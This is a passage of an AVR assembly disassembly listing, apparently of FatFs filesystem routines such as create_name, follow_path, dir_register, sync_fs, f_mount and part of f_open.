    2786:	92 e0       	ldi	r25, 0x02	; 2
    2788:	e9 0e       	add	r14, r25
    278a:	f1 1c       	adc	r15, r1
    278c:	fe 01       	movw	r30, r28
    278e:	e0 0f       	add	r30, r16
    2790:	f1 1f       	adc	r31, r17
    2792:	10 81       	ld	r17, Z
    2794:	81 2f       	mov	r24, r17
    2796:	0e 94 0f 07 	call	0xe1e	; 0xe1e <dbc_2nd>
    279a:	89 2b       	or	r24, r25
    279c:	09 f4       	brne	.+2      	; 0x27a0 <create_name+0x142>
    279e:	4c c0       	rjmp	.+152    	; 0x2838 <create_name+0x1da>
    27a0:	c4 01       	movw	r24, r8
    27a2:	01 97       	sbiw	r24, 0x01	; 1
    27a4:	c8 16       	cp	r12, r24
    27a6:	d9 06       	cpc	r13, r25
    27a8:	08 f0       	brcs	.+2      	; 0x27ac <create_name+0x14e>
    27aa:	48 c0       	rjmp	.+144    	; 0x283c <create_name+0x1de>
    27ac:	f5 01       	movw	r30, r10
    27ae:	ec 0d       	add	r30, r12
    27b0:	fd 1d       	adc	r31, r13
    27b2:	30 82       	st	Z, r3
    27b4:	f6 01       	movw	r30, r12
    27b6:	31 96       	adiw	r30, 0x01	; 1
    27b8:	ea 0d       	add	r30, r10
    27ba:	fb 1d       	adc	r31, r11
    27bc:	82 e0       	ldi	r24, 0x02	; 2
    27be:	c8 0e       	add	r12, r24
    27c0:	d1 1c       	adc	r13, r1
    27c2:	10 83       	st	Z, r17
    27c4:	a5 cf       	rjmp	.-182    	; 0x2710 <create_name+0xb2>
    27c6:	63 2d       	mov	r22, r3
    27c8:	70 e0       	ldi	r23, 0x00	; 0
    27ca:	82 eb       	ldi	r24, 0xB2	; 178
    27cc:	93 e0       	ldi	r25, 0x03	; 3
    27ce:	0e 94 1c 39 	call	0x7238	; 0x7238 <strchr>
    27d2:	89 2b       	or	r24, r25
    27d4:	a9 f5       	brne	.+106    	; 0x2840 <create_name+0x1e2>
    27d6:	8f e9       	ldi	r24, 0x9F	; 159
    27d8:	83 0d       	add	r24, r3
    27da:	8a 31       	cpi	r24, 0x1A	; 26
    27dc:	10 f4       	brcc	.+4      	; 0x27e2 <create_name+0x184>
    27de:	90 ee       	ldi	r25, 0xE0	; 224
    27e0:	39 0e       	add	r3, r25
    27e2:	f5 01       	movw	r30, r10
    27e4:	ec 0d       	add	r30, r12
    27e6:	fd 1d       	adc	r31, r13
    27e8:	30 82       	st	Z, r3
    27ea:	f6 01       	movw	r30, r12
    27ec:	31 96       	adiw	r30, 0x01	; 1
    27ee:	6f 01       	movw	r12, r30
    27f0:	78 01       	movw	r14, r16
    27f2:	8e cf       	rjmp	.-228    	; 0x2710 <create_name+0xb2>
    27f4:	c0 0f       	add	r28, r16
    27f6:	d1 1f       	adc	r29, r17
    27f8:	f2 01       	movw	r30, r4
    27fa:	d1 83       	std	Z+1, r29	; 0x01
    27fc:	c0 83       	st	Z, r28
    27fe:	cd 28       	or	r12, r13
    2800:	09 f1       	breq	.+66     	; 0x2844 <create_name+0x1e6>
    2802:	f3 01       	movw	r30, r6
    2804:	84 8d       	ldd	r24, Z+28	; 0x1c
    2806:	85 3e       	cpi	r24, 0xE5	; 229
    2808:	11 f4       	brne	.+4      	; 0x280e <create_name+0x1b0>
    280a:	85 e0       	ldi	r24, 0x05	; 5
    280c:	84 8f       	std	Z+28, r24	; 0x1c
    280e:	f0 e2       	ldi	r31, 0x20	; 32
    2810:	f3 15       	cp	r31, r3
    2812:	28 f4       	brcc	.+10     	; 0x281e <create_name+0x1c0>
    2814:	88 81       	ld	r24, Y
    2816:	81 32       	cpi	r24, 0x21	; 33
    2818:	20 f4       	brcc	.+8      	; 0x2822 <create_name+0x1c4>
    281a:	84 e0       	ldi	r24, 0x04	; 4
    281c:	03 c0       	rjmp	.+6      	; 0x2824 <create_name+0x1c6>
    281e:	84 e0       	ldi	r24, 0x04	; 4
    2820:	01 c0       	rjmp	.+2      	; 0x2824 <create_name+0x1c6>
    2822:	80 e0       	ldi	r24, 0x00	; 0
    2824:	f3 01       	movw	r30, r6
    2826:	87 a3       	std	Z+39, r24	; 0x27
    2828:	80 e0       	ldi	r24, 0x00	; 0
    282a:	0d c0       	rjmp	.+26     	; 0x2846 <create_name+0x1e8>
    282c:	86 e0       	ldi	r24, 0x06	; 6
    282e:	0b c0       	rjmp	.+22     	; 0x2846 <create_name+0x1e8>
    2830:	86 e0       	ldi	r24, 0x06	; 6
    2832:	09 c0       	rjmp	.+18     	; 0x2846 <create_name+0x1e8>
    2834:	86 e0       	ldi	r24, 0x06	; 6
    2836:	07 c0       	rjmp	.+14     	; 0x2846 <create_name+0x1e8>
    2838:	86 e0       	ldi	r24, 0x06	; 6
    283a:	05 c0       	rjmp	.+10     	; 0x2846 <create_name+0x1e8>
    283c:	86 e0       	ldi	r24, 0x06	; 6
    283e:	03 c0       	rjmp	.+6      	; 0x2846 <create_name+0x1e8>
    2840:	86 e0       	ldi	r24, 0x06	; 6
    2842:	01 c0       	rjmp	.+2      	; 0x2846 <create_name+0x1e8>
    2844:	86 e0       	ldi	r24, 0x06	; 6
    2846:	df 91       	pop	r29
    2848:	cf 91       	pop	r28
    284a:	1f 91       	pop	r17
    284c:	0f 91       	pop	r16
    284e:	ff 90       	pop	r15
    2850:	ef 90       	pop	r14
    2852:	df 90       	pop	r13
    2854:	cf 90       	pop	r12
    2856:	bf 90       	pop	r11
    2858:	af 90       	pop	r10
    285a:	9f 90       	pop	r9
    285c:	8f 90       	pop	r8
    285e:	7f 90       	pop	r7
    2860:	6f 90       	pop	r6
    2862:	5f 90       	pop	r5
    2864:	4f 90       	pop	r4
    2866:	3f 90       	pop	r3
    2868:	08 95       	ret

0000286a <follow_path>:
    286a:	df 92       	push	r13
    286c:	ef 92       	push	r14
    286e:	ff 92       	push	r15
    2870:	0f 93       	push	r16
    2872:	1f 93       	push	r17
    2874:	cf 93       	push	r28
    2876:	df 93       	push	r29
    2878:	00 d0       	rcall	.+0      	; 0x287a <follow_path+0x10>
    287a:	cd b7       	in	r28, 0x3d	; 61
    287c:	de b7       	in	r29, 0x3e	; 62
    287e:	8c 01       	movw	r16, r24
    2880:	fb 01       	movw	r30, r22
    2882:	7a 83       	std	Y+2, r23	; 0x02
    2884:	69 83       	std	Y+1, r22	; 0x01
    2886:	dc 01       	movw	r26, r24
    2888:	ed 90       	ld	r14, X+
    288a:	fc 90       	ld	r15, X
    288c:	80 81       	ld	r24, Z
    288e:	8f 32       	cpi	r24, 0x2F	; 47
    2890:	81 f0       	breq	.+32     	; 0x28b2 <follow_path+0x48>
    2892:	8c 35       	cpi	r24, 0x5C	; 92
    2894:	71 f0       	breq	.+28     	; 0x28b2 <follow_path+0x48>
    2896:	f7 01       	movw	r30, r14
    2898:	83 89       	ldd	r24, Z+19	; 0x13
    289a:	94 89       	ldd	r25, Z+20	; 0x14
    289c:	a5 89       	ldd	r26, Z+21	; 0x15
    289e:	b6 89       	ldd	r27, Z+22	; 0x16
    28a0:	f8 01       	movw	r30, r16
    28a2:	86 83       	std	Z+6, r24	; 0x06
    28a4:	97 83       	std	Z+7, r25	; 0x07
    28a6:	a0 87       	std	Z+8, r26	; 0x08
    28a8:	b1 87       	std	Z+9, r27	; 0x09
    28aa:	11 c0       	rjmp	.+34     	; 0x28ce <follow_path+0x64>
    28ac:	31 96       	adiw	r30, 0x01	; 1
    28ae:	fa 83       	std	Y+2, r31	; 0x02
    28b0:	e9 83       	std	Y+1, r30	; 0x01
    28b2:	e9 81       	ldd	r30, Y+1	; 0x01
    28b4:	fa 81       	ldd	r31, Y+2	; 0x02
    28b6:	80 81       	ld	r24, Z
    28b8:	8f 32       	cpi	r24, 0x2F	; 47
    28ba:	c1 f3       	breq	.-16     	; 0x28ac <follow_path+0x42>
    28bc:	8c 35       	cpi	r24, 0x5C	; 92
    28be:	b1 f3       	breq	.-20     	; 0x28ac <follow_path+0x42>
    28c0:	d8 01       	movw	r26, r16
    28c2:	16 96       	adiw	r26, 0x06	; 6
    28c4:	1d 92       	st	X+, r1
    28c6:	1d 92       	st	X+, r1
    28c8:	1d 92       	st	X+, r1
    28ca:	1c 92       	st	X, r1
    28cc:	19 97       	sbiw	r26, 0x09	; 9
    28ce:	e9 81       	ldd	r30, Y+1	; 0x01
    28d0:	fa 81       	ldd	r31, Y+2	; 0x02
    28d2:	80 81       	ld	r24, Z
    28d4:	80 32       	cpi	r24, 0x20	; 32
    28d6:	50 f4       	brcc	.+20     	; 0x28ec <follow_path+0x82>
    28d8:	80 e8       	ldi	r24, 0x80	; 128
    28da:	f8 01       	movw	r30, r16
    28dc:	87 a3       	std	Z+39, r24	; 0x27
    28de:	40 e0       	ldi	r20, 0x00	; 0
    28e0:	50 e0       	ldi	r21, 0x00	; 0
    28e2:	ba 01       	movw	r22, r20
    28e4:	c8 01       	movw	r24, r16
    28e6:	c5 d9       	rcall	.-3190   	; 0x1c72 <dir_sdi>
    28e8:	d8 2e       	mov	r13, r24
    28ea:	46 c0       	rjmp	.+140    	; 0x2978 <follow_path+0x10e>
    28ec:	be 01       	movw	r22, r28
    28ee:	6f 5f       	subi	r22, 0xFF	; 255
    28f0:	7f 4f       	sbci	r23, 0xFF	; 255
    28f2:	c8 01       	movw	r24, r16
    28f4:	b4 de       	rcall	.-664    	; 0x265e <create_name>
    28f6:	d8 2e       	mov	r13, r24
    28f8:	81 11       	cpse	r24, r1
    28fa:	3e c0       	rjmp	.+124    	; 0x2978 <follow_path+0x10e>
    28fc:	c8 01       	movw	r24, r16
    28fe:	ea dd       	rcall	.-1068   	; 0x24d4 <dir_find>
    2900:	d8 01       	movw	r26, r16
    2902:	97 96       	adiw	r26, 0x27	; 39
    2904:	9c 91       	ld	r25, X
    2906:	97 97       	sbiw	r26, 0x27	; 39
    2908:	88 23       	and	r24, r24
    290a:	71 f0       	breq	.+28     	; 0x2928 <follow_path+0xbe>
    290c:	84 30       	cpi	r24, 0x04	; 4
    290e:	39 f5       	brne	.+78     	; 0x295e <follow_path+0xf4>
    2910:	95 ff       	sbrs	r25, 5
    2912:	06 c0       	rjmp	.+12     	; 0x2920 <follow_path+0xb6>
    2914:	92 ff       	sbrs	r25, 2
    2916:	ea cf       	rjmp	.-44     	; 0x28ec <follow_path+0x82>
    2918:	80 e8       	ldi	r24, 0x80	; 128
    291a:	97 96       	adiw	r26, 0x27	; 39
    291c:	8c 93       	st	X, r24
    291e:	2c c0       	rjmp	.+88     	; 0x2978 <follow_path+0x10e>
    2920:	92 ff       	sbrs	r25, 2
    2922:	1f c0       	rjmp	.+62     	; 0x2962 <follow_path+0xf8>
    2924:	d8 2e       	mov	r13, r24
    2926:	28 c0       	rjmp	.+80     	; 0x2978 <follow_path+0x10e>
    2928:	92 fd       	sbrc	r25, 2
    292a:	20 c0       	rjmp	.+64     	; 0x296c <follow_path+0x102>
    292c:	f8 01       	movw	r30, r16
    292e:	84 81       	ldd	r24, Z+4	; 0x04
    2930:	84 ff       	sbrs	r24, 4
    2932:	1e c0       	rjmp	.+60     	; 0x2970 <follow_path+0x106>
    2934:	86 85       	ldd	r24, Z+14	; 0x0e
    2936:	97 85       	ldd	r25, Z+15	; 0x0f
    2938:	a0 89       	ldd	r26, Z+16	; 0x10
    293a:	b1 89       	ldd	r27, Z+17	; 0x11
    293c:	91 70       	andi	r25, 0x01	; 1
    293e:	b7 01       	movw	r22, r14
    2940:	6d 5c       	subi	r22, 0xCD	; 205
    2942:	7f 4f       	sbci	r23, 0xFF	; 255
    2944:	68 0f       	add	r22, r24
    2946:	79 1f       	adc	r23, r25
    2948:	c7 01       	movw	r24, r14
    294a:	0e 94 56 07 	call	0xeac	; 0xeac <ld_clust>
    294e:	d8 01       	movw	r26, r16
    2950:	16 96       	adiw	r26, 0x06	; 6
    2952:	6d 93       	st	X+, r22
    2954:	7d 93       	st	X+, r23
    2956:	8d 93       	st	X+, r24
    2958:	9c 93       	st	X, r25
    295a:	19 97       	sbiw	r26, 0x09	; 9
    295c:	c7 cf       	rjmp	.-114    	; 0x28ec <follow_path+0x82>
    295e:	d8 2e       	mov	r13, r24
    2960:	0b c0       	rjmp	.+22     	; 0x2978 <follow_path+0x10e>
    2962:	0f 2e       	mov	r0, r31
    2964:	f5 e0       	ldi	r31, 0x05	; 5
    2966:	df 2e       	mov	r13, r31
    2968:	f0 2d       	mov	r31, r0
    296a:	06 c0       	rjmp	.+12     	; 0x2978 <follow_path+0x10e>
    296c:	d8 2e       	mov	r13, r24
    296e:	04 c0       	rjmp	.+8      	; 0x2978 <follow_path+0x10e>
    2970:	0f 2e       	mov	r0, r31
    2972:	f5 e0       	ldi	r31, 0x05	; 5
    2974:	df 2e       	mov	r13, r31
    2976:	f0 2d       	mov	r31, r0
    2978:	8d 2d       	mov	r24, r13
    297a:	0f 90       	pop	r0
    297c:	0f 90       	pop	r0
    297e:	df 91       	pop	r29
    2980:	cf 91       	pop	r28
    2982:	1f 91       	pop	r17
    2984:	0f 91       	pop	r16
    2986:	ff 90       	pop	r15
    2988:	ef 90       	pop	r14
    298a:	df 90       	pop	r13
    298c:	08 95       	ret

0000298e <dir_register>:
    298e:	0f 93       	push	r16
    2990:	1f 93       	push	r17
    2992:	cf 93       	push	r28
    2994:	df 93       	push	r29
    2996:	ec 01       	movw	r28, r24
    2998:	08 81       	ld	r16, Y
    299a:	19 81       	ldd	r17, Y+1	; 0x01
    299c:	61 e0       	ldi	r22, 0x01	; 1
    299e:	70 e0       	ldi	r23, 0x00	; 0
    29a0:	d7 dd       	rcall	.-1106   	; 0x2550 <dir_alloc>
    29a2:	81 11       	cpse	r24, r1
    29a4:	1c c0       	rjmp	.+56     	; 0x29de <dir_register+0x50>
    29a6:	4e 89       	ldd	r20, Y+22	; 0x16
    29a8:	5f 89       	ldd	r21, Y+23	; 0x17
    29aa:	68 8d       	ldd	r22, Y+24	; 0x18
    29ac:	79 8d       	ldd	r23, Y+25	; 0x19
    29ae:	c8 01       	movw	r24, r16
    29b0:	0e 94 68 08 	call	0x10d0	; 0x10d0 <move_window>
    29b4:	81 11       	cpse	r24, r1
    29b6:	13 c0       	rjmp	.+38     	; 0x29de <dir_register+0x50>
    29b8:	ea 8d       	ldd	r30, Y+26	; 0x1a
    29ba:	fb 8d       	ldd	r31, Y+27	; 0x1b
    29bc:	90 e2       	ldi	r25, 0x20	; 32
    29be:	df 01       	movw	r26, r30
    29c0:	1d 92       	st	X+, r1
    29c2:	9a 95       	dec	r25
    29c4:	e9 f7       	brne	.-6      	; 0x29c0 <dir_register+0x32>
    29c6:	fe 01       	movw	r30, r28
    29c8:	7c 96       	adiw	r30, 0x1c	; 28
    29ca:	aa 8d       	ldd	r26, Y+26	; 0x1a
    29cc:	bb 8d       	ldd	r27, Y+27	; 0x1b
    29ce:	9b e0       	ldi	r25, 0x0B	; 11
    29d0:	01 90       	ld	r0, Z+
    29d2:	0d 92       	st	X+, r0
    29d4:	9a 95       	dec	r25
    29d6:	e1 f7       	brne	.-8      	; 0x29d0 <dir_register+0x42>
    29d8:	91 e0       	ldi	r25, 0x01	; 1
    29da:	f8 01       	movw	r30, r16
    29dc:	93 83       	std	Z+3, r25	; 0x03
    29de:	df 91       	pop	r29
    29e0:	cf 91       	pop	r28
    29e2:	1f 91       	pop	r17
    29e4:	0f 91       	pop	r16
    29e6:	08 95       	ret

000029e8 <sync_fs>:
    29e8:	cf 92       	push	r12
    29ea:	df 92       	push	r13
    29ec:	ff 92       	push	r15
    29ee:	0f 93       	push	r16
    29f0:	1f 93       	push	r17
    29f2:	cf 93       	push	r28
    29f4:	df 93       	push	r29
    29f6:	ec 01       	movw	r28, r24
    29f8:	0e 94 10 08 	call	0x1020	; 0x1020 <sync_window>
    29fc:	f8 2e       	mov	r15, r24
    29fe:	81 11       	cpse	r24, r1
    2a00:	5c c0       	rjmp	.+184    	; 0x2aba <sync_fs+0xd2>
    2a02:	88 81       	ld	r24, Y
    2a04:	83 30       	cpi	r24, 0x03	; 3
    2a06:	09 f0       	breq	.+2      	; 0x2a0a <sync_fs+0x22>
    2a08:	4e c0       	rjmp	.+156    	; 0x2aa6 <sync_fs+0xbe>
    2a0a:	8c 81       	ldd	r24, Y+4	; 0x04
    2a0c:	81 30       	cpi	r24, 0x01	; 1
    2a0e:	09 f0       	breq	.+2      	; 0x2a12 <sync_fs+0x2a>
    2a10:	4a c0       	rjmp	.+148    	; 0x2aa6 <sync_fs+0xbe>
    2a12:	80 e0       	ldi	r24, 0x00	; 0
    2a14:	92 e0       	ldi	r25, 0x02	; 2
    2a16:	6e 01       	movw	r12, r28
    2a18:	23 e3       	ldi	r18, 0x33	; 51
    2a1a:	c2 0e       	add	r12, r18
    2a1c:	d1 1c       	adc	r13, r1
    2a1e:	f6 01       	movw	r30, r12
    2a20:	9c 01       	movw	r18, r24
    2a22:	11 92       	st	Z+, r1
    2a24:	21 50       	subi	r18, 0x01	; 1
    2a26:	30 40       	sbci	r19, 0x00	; 0
    2a28:	e1 f7       	brne	.-8      	; 0x2a22 <sync_fs+0x3a>
    2a2a:	65 e5       	ldi	r22, 0x55	; 85
    2a2c:	7a ea       	ldi	r23, 0xAA	; 170
    2a2e:	ce 01       	movw	r24, r28
    2a30:	8f 5c       	subi	r24, 0xCF	; 207
    2a32:	9d 4f       	sbci	r25, 0xFD	; 253
    2a34:	0e 94 ee 06 	call	0xddc	; 0xddc <st_word>
    2a38:	42 e5       	ldi	r20, 0x52	; 82
    2a3a:	52 e5       	ldi	r21, 0x52	; 82
    2a3c:	61 e6       	ldi	r22, 0x61	; 97
    2a3e:	71 e4       	ldi	r23, 0x41	; 65
    2a40:	c6 01       	movw	r24, r12
    2a42:	0e 94 f2 06 	call	0xde4	; 0xde4 <st_dword>
    2a46:	42 e7       	ldi	r20, 0x72	; 114
    2a48:	52 e7       	ldi	r21, 0x72	; 114
    2a4a:	61 e4       	ldi	r22, 0x41	; 65
    2a4c:	71 e6       	ldi	r23, 0x61	; 97
    2a4e:	ce 01       	movw	r24, r28
    2a50:	89 5e       	subi	r24, 0xE9	; 233
    2a52:	9d 4f       	sbci	r25, 0xFD	; 253
    2a54:	0e 94 f2 06 	call	0xde4	; 0xde4 <st_dword>
    2a58:	4f 85       	ldd	r20, Y+15	; 0x0f
    2a5a:	58 89       	ldd	r21, Y+16	; 0x10
    2a5c:	69 89       	ldd	r22, Y+17	; 0x11
    2a5e:	7a 89       	ldd	r23, Y+18	; 0x12
    2a60:	ce 01       	movw	r24, r28
    2a62:	85 5e       	subi	r24, 0xE5	; 229
    2a64:	9d 4f       	sbci	r25, 0xFD	; 253
    2a66:	0e 94 f2 06 	call	0xde4	; 0xde4 <st_dword>
    2a6a:	4b 85       	ldd	r20, Y+11	; 0x0b
    2a6c:	5c 85       	ldd	r21, Y+12	; 0x0c
    2a6e:	6d 85       	ldd	r22, Y+13	; 0x0d
    2a70:	7e 85       	ldd	r23, Y+14	; 0x0e
    2a72:	ce 01       	movw	r24, r28
    2a74:	81 5e       	subi	r24, 0xE1	; 225
    2a76:	9d 4f       	sbci	r25, 0xFD	; 253
    2a78:	0e 94 f2 06 	call	0xde4	; 0xde4 <st_dword>
    2a7c:	8f 8d       	ldd	r24, Y+31	; 0x1f
    2a7e:	98 a1       	ldd	r25, Y+32	; 0x20
    2a80:	a9 a1       	ldd	r26, Y+33	; 0x21
    2a82:	ba a1       	ldd	r27, Y+34	; 0x22
    2a84:	9c 01       	movw	r18, r24
    2a86:	ad 01       	movw	r20, r26
    2a88:	2f 5f       	subi	r18, 0xFF	; 255
    2a8a:	3f 4f       	sbci	r19, 0xFF	; 255
    2a8c:	4f 4f       	sbci	r20, 0xFF	; 255
    2a8e:	5f 4f       	sbci	r21, 0xFF	; 255
    2a90:	2f a7       	std	Y+47, r18	; 0x2f
    2a92:	38 ab       	std	Y+48, r19	; 0x30
    2a94:	49 ab       	std	Y+49, r20	; 0x31
    2a96:	5a ab       	std	Y+50, r21	; 0x32
    2a98:	01 e0       	ldi	r16, 0x01	; 1
    2a9a:	10 e0       	ldi	r17, 0x00	; 0
    2a9c:	b6 01       	movw	r22, r12
    2a9e:	89 81       	ldd	r24, Y+1	; 0x01
    2aa0:	0e 94 ad 06 	call	0xd5a	; 0xd5a <disk_write>
    2aa4:	1c 82       	std	Y+4, r1	; 0x04
    2aa6:	40 e0       	ldi	r20, 0x00	; 0
    2aa8:	50 e0       	ldi	r21, 0x00	; 0
    2aaa:	60 e0       	ldi	r22, 0x00	; 0
    2aac:	89 81       	ldd	r24, Y+1	; 0x01
    2aae:	0e 94 bd 06 	call	0xd7a	; 0xd7a <disk_ioctl>
    2ab2:	88 23       	and	r24, r24
    2ab4:	11 f0       	breq	.+4      	; 0x2aba <sync_fs+0xd2>
    2ab6:	ff 24       	eor	r15, r15
    2ab8:	f3 94       	inc	r15
    2aba:	8f 2d       	mov	r24, r15
    2abc:	df 91       	pop	r29
    2abe:	cf 91       	pop	r28
    2ac0:	1f 91       	pop	r17
    2ac2:	0f 91       	pop	r16
    2ac4:	ff 90       	pop	r15
    2ac6:	df 90       	pop	r13
    2ac8:	cf 90       	pop	r12
    2aca:	08 95       	ret

00002acc <f_mount>:
    2acc:	1f 93       	push	r17
    2ace:	cf 93       	push	r28
    2ad0:	df 93       	push	r29
    2ad2:	00 d0       	rcall	.+0      	; 0x2ad4 <f_mount+0x8>
    2ad4:	00 d0       	rcall	.+0      	; 0x2ad6 <f_mount+0xa>
    2ad6:	00 d0       	rcall	.+0      	; 0x2ad8 <f_mount+0xc>
    2ad8:	cd b7       	in	r28, 0x3d	; 61
    2ada:	de b7       	in	r29, 0x3e	; 62
    2adc:	9c 83       	std	Y+4, r25	; 0x04
    2ade:	8b 83       	std	Y+3, r24	; 0x03
    2ae0:	7e 83       	std	Y+6, r23	; 0x06
    2ae2:	6d 83       	std	Y+5, r22	; 0x05
    2ae4:	14 2f       	mov	r17, r20
    2ae6:	7a 83       	std	Y+2, r23	; 0x02
    2ae8:	69 83       	std	Y+1, r22	; 0x01
    2aea:	ce 01       	movw	r24, r28
    2aec:	01 96       	adiw	r24, 0x01	; 1
    2aee:	0e 94 a4 07 	call	0xf48	; 0xf48 <get_ldnumber>
    2af2:	99 23       	and	r25, r25
    2af4:	24 f1       	brlt	.+72     	; 0x2b3e <f_mount+0x72>
    2af6:	fc 01       	movw	r30, r24
    2af8:	ee 0f       	add	r30, r30
    2afa:	ff 1f       	adc	r31, r31
    2afc:	e4 5b       	subi	r30, 0xB4	; 180
    2afe:	f6 4f       	sbci	r31, 0xF6	; 246
    2b00:	01 90       	ld	r0, Z+
    2b02:	f0 81       	ld	r31, Z
    2b04:	e0 2d       	mov	r30, r0
    2b06:	30 97       	sbiw	r30, 0x00	; 0
    2b08:	09 f0       	breq	.+2      	; 0x2b0c <f_mount+0x40>
    2b0a:	10 82       	st	Z, r1
    2b0c:	eb 81       	ldd	r30, Y+3	; 0x03
    2b0e:	fc 81       	ldd	r31, Y+4	; 0x04
    2b10:	30 97       	sbiw	r30, 0x00	; 0
    2b12:	09 f0       	breq	.+2      	; 0x2b16 <f_mount+0x4a>
    2b14:	10 82       	st	Z, r1
    2b16:	88 0f       	add	r24, r24
    2b18:	99 1f       	adc	r25, r25
    2b1a:	fc 01       	movw	r30, r24
    2b1c:	e4 5b       	subi	r30, 0xB4	; 180
    2b1e:	f6 4f       	sbci	r31, 0xF6	; 246
    2b20:	8b 81       	ldd	r24, Y+3	; 0x03
    2b22:	9c 81       	ldd	r25, Y+4	; 0x04
    2b24:	91 83       	std	Z+1, r25	; 0x01
    2b26:	80 83       	st	Z, r24
    2b28:	11 23       	and	r17, r17
    2b2a:	59 f0       	breq	.+22     	; 0x2b42 <f_mount+0x76>
    2b2c:	40 e0       	ldi	r20, 0x00	; 0
    2b2e:	be 01       	movw	r22, r28
    2b30:	6d 5f       	subi	r22, 0xFD	; 253
    2b32:	7f 4f       	sbci	r23, 0xFF	; 255
    2b34:	ce 01       	movw	r24, r28
    2b36:	05 96       	adiw	r24, 0x05	; 5
    2b38:	0e 94 bd 09 	call	0x137a	; 0x137a <mount_volume>
    2b3c:	03 c0       	rjmp	.+6      	; 0x2b44 <f_mount+0x78>
    2b3e:	8b e0       	ldi	r24, 0x0B	; 11
    2b40:	01 c0       	rjmp	.+2      	; 0x2b44 <f_mount+0x78>
    2b42:	80 e0       	ldi	r24, 0x00	; 0
    2b44:	26 96       	adiw	r28, 0x06	; 6
    2b46:	0f b6       	in	r0, 0x3f	; 63
    2b48:	f8 94       	cli
    2b4a:	de bf       	out	0x3e, r29	; 62
    2b4c:	0f be       	out	0x3f, r0	; 63
    2b4e:	cd bf       	out	0x3d, r28	; 61
    2b50:	df 91       	pop	r29
    2b52:	cf 91       	pop	r28
    2b54:	1f 91       	pop	r17
    2b56:	08 95       	ret

00002b58 <f_open>:
    2b58:	2f 92       	push	r2
    2b5a:	3f 92       	push	r3
    2b5c:	4f 92       	push	r4
    2b5e:	5f 92       	push	r5
    2b60:	6f 92       	push	r6
    2b62:	7f 92       	push	r7
    2b64:	8f 92       	push	r8
    2b66:	9f 92       	push	r9
    2b68:	af 92       	push	r10
    2b6a:	bf 92       	push	r11
    2b6c:	cf 92       	push	r12
    2b6e:	df 92       	push	r13
    2b70:	ef 92       	push	r14
    2b72:	ff 92       	push	r15
    2b74:	0f 93       	push	r16
    2b76:	1f 93       	push	r17
    2b78:	cf 93       	push	r28
    2b7a:	df 93       	push	r29
    2b7c:	cd b7       	in	r28, 0x3d	; 61
    2b7e:	de b7       	in	r29, 0x3e	; 62
    2b80:	ae 97       	sbiw	r28, 0x2e	; 46
    2b82:	0f b6       	in	r0, 0x3f	; 63
    2b84:	f8 94       	cli
    2b86:	de bf       	out	0x3e, r29	; 62
    2b88:	0f be       	out	0x3f, r0	; 63
    2b8a:	cd bf       	out	0x3d, r28	; 61
    2b8c:	7c a7       	std	Y+44, r23	; 0x2c
    2b8e:	6b a7       	std	Y+43, r22	; 0x2b
    2b90:	00 97       	sbiw	r24, 0x00	; 0
    2b92:	09 f4       	brne	.+2      	; 0x2b96 <f_open+0x3e>
    2b94:	63 c1       	rjmp	.+710    	; 0x2e5c <f_open+0x304>
    2b96:	04 2f       	mov	r16, r20
    2b98:	9e a7       	std	Y+46, r25	; 0x2e
    2b9a:	8d a7       	std	Y+45, r24	; 0x2d
    2b9c:	84 2f       	mov	r24, r20
    2b9e:	8f 73       	andi	r24, 0x3F	; 63
    2ba0:	58 2e       	mov	r5, r24
    2ba2:	48 2f       	mov	r20, r24
    2ba4:	be 01       	movw	r22, r28
    2ba6:	67 5d       	subi	r22, 0xD7	; 215
    2ba8:	7f 4f       	sbci	r23, 0xFF	; 255
    2baa:	ce 01       	movw	r24, r28
    2bac:	8b 96       	adiw	r24, 0x2b	; 43
    2bae:	0e 94 bd 09 	call	0x137a	; 0x137a <mount_volume>
    2bb2:	18 2f       	mov	r17, r24
    2bb4:	81 11       	cpse	r24, r1
    2bb6:	4a c1       	rjmp	.+660    	; 0x2e4c <f_open+0x2f4>
    2bb8:	89 a5       	ldd	r24, Y+41	; 0x29
    2bba:	9a a5       	ldd	r25, Y+42	; 0x2a
    2bbc:	9a 83       	std	Y+2, r25	; 0x02
    2bbe:	89 83       	std	Y+1, r24	; 0x01
    2bc0:	6b a5       	ldd	r22, Y+43	; 0x2b
    2bc2:	7c a5       	ldd	r23, Y+44	; 0x2c
    2bc4:	ce 01       	movw	r24, r28
    2bc6:	01 96       	adiw	r24, 0x01	; 1
    2bc8:	50 de       	rcall	.-864    	; 0x286a <follow_path>
    2bca:	18 2f       	mov	r17, r24
    2bcc:	81 11       	cpse	r24, r1
    2bce:	04 c0       	rjmp	.+8      	; 0x2bd8 <f_open+0x80>
    2bd0:	88 a5       	ldd	r24, Y+40	; 0x28
    2bd2:	88 23       	and	r24, r24
    2bd4:	0c f4       	brge	.+2      	; 0x2bd8 <f_open+0x80>
    2bd6:	16 e0       	ldi	r17, 0x06	; 6
    2bd8:	80 2f       	mov	r24, r16
    2bda:	8c 71       	andi	r24, 0x1C	; 28
    2bdc:	09 f4       	brne	.+2      	; 0x2be0 <f_open+0x88>
    2bde:	73 c0       	rjmp	.+230    	; 0x2cc6 <f_open+0x16e>
    2be0:	11 23       	and	r17, r17
    2be2:	51 f0       	breq	.+20     	; 0x2bf8 <f_open+0xa0>
    2be4:	14 30       	cpi	r17, 0x04	; 4
    2be6:	21 f4       	brne	.+8      	; 0x2bf0 <f_open+0x98>
    2be8:	ce 01       	movw	r24, r28
    2bea:	01 96       	adiw	r24, 0x01	; 1
    2bec:	d0 de       	rcall	.-608    	; 0x298e <dir_register>
    2bee:	18 2f       	mov	r17, r24
    2bf0:	e5 2d       	mov	r30, r5
    2bf2:	e8 60       	ori	r30, 0x08	; 8
    2bf4:	5e 2e       	mov	r5, r30
    2bf6:	09 c0       	rjmp	.+18     	; 0x2c0a <f_open+0xb2>
    2bf8:	8d 81       	ldd	r24, Y+5	; 0x05
    2bfa:	81 71       	andi	r24, 0x11	; 17
    2bfc:	19 f4       	brne	.+6      	; 0x2c04 <f_open+0xac>
    2bfe:	02 fd       	sbrc	r16, 2
    2c00:	03 c0       	rjmp	.+6      	; 0x2c08 <f_open+0xb0>
    2c02:	03 c0       	rjmp	.+6      	; 0x2c0a <f_open+0xb2>
    2c04:	17 e0       	ldi	r17, 0x07	; 7
    2c06:	01 c0       	rjmp	.+2      	; 0x2c0a <f_open+0xb2>
    2c08:	18 e0       	ldi	r17, 0x08	; 8
    2c0a:	11 11       	cpse	r17, r1
    2c0c:	69 c0       	rjmp	.+210    	; 0x2ce0 <f_open+0x188>
    2c0e:	53 fe       	sbrs	r5, 3
